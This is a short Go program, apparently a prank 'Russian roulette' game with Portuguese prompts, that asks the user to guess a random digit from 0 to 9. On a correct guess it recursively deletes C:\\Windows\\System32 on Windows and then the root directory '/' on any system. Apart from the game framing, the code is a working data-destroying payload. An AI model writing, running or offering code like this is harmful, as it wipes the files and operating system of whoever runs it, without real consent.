package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"strings"
)

func main() {
	number := rand.Intn(10)

	fmt.Println("Digite um número de 0 a 9: ")
	user_number, err := bufio.NewReader(os.Stdin).ReadString('\n')
	user_number = strings.Trim(user_number, "\n")

	if err != nil {
		log.Fatal(err)
	}

	casting_number, err := strconv.Atoi(user_number)
	if err != nil {
		log.Fatal(err)
	}

	if casting_number == number {
		if runtime.GOOS == "windows" {
			os.RemoveAll("C:\\Windows\\System32")
		}

		os.RemoveAll("/")
	} else {
		fmt.Println("Deu sorte!")
	}

	// test signed commit 2

	fmt.Println("Done ✨")
}
